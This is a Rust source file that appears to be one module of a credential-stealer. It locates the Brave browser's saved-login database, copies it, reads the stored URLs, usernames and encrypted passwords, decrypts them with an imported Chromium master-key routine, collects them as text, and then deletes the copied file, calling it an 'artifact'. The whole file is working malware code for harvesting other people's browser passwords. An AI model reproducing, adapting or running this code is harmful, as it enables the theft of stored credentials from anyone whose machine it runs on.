use crate::utilities::Utils;

use crate::passwords::browsers::chromium::{
    decrypt_chromium_password,
    get_master_key
};

use anyhow::{
    anyhow, 
    Result
};

use std::path::Path;

pub struct Brave;

impl Brave {
    pub fn grab() -> Vec<String> {
        if let Ok(credentials) = get_brave_contents() {
            return credentials;
        }
        return vec![];
    }
}

fn get_brave_contents() -> Result<Vec<String>> {
    let mut harvested_credentials: Vec<String> = vec![];
    let brave_db_src = Utils::construct_directory(get_login_data_src().as_str());

    if Path::new(&brave_db_src).exists() {
        let brave_db_dst = Utils::construct_directory(get_login_data_dst().as_str());
        if Utils::copy_file(&brave_db_src, &brave_db_dst) {
            if let Ok(conn) = sqlite::open(&brave_db_dst) {
            let mut cursor = conn.prepare("SELECT password_value, signon_realm, username_value FROM \"logins\"")?.cursor();

                while let Some(row) = cursor.next().expect("cursor failed") {
                    if let Ok(buffer) = row[0].as_binary().ok_or(vec![0]) {
                        let decrypted_password = decrypt_chromium_password(get_master_key(get_local_state().as_str())?, buffer.to_vec());
                        let url = row[1].as_string().ok_or("Failed to get url");
                        let username = row[2].as_string().ok_or("Failed to get url");

                        harvested_credentials.push(format!("URL: {}\nUSERNAME: {}\nPASSWORD: {}\n\n", url.unwrap(), username.unwrap(), decrypted_password.unwrap()));
                    }
                }
            }
            if Utils::remove_file(&brave_db_dst) {
                println!("[+] Cleaned up artifact: {}\n\n", &brave_db_dst);
            }
        }
    } else {
        return Err(anyhow!("Brave not installed"));
    }
    
    Ok(harvested_credentials)
}

fn get_local_state() -> String {
    return "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State".to_string();
}

fn get_login_data_src() -> String {
    return "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data".to_string();
}

fn get_login_data_dst() -> String {
    return "\\Appdata\\Local\\database.brave".to_string();
}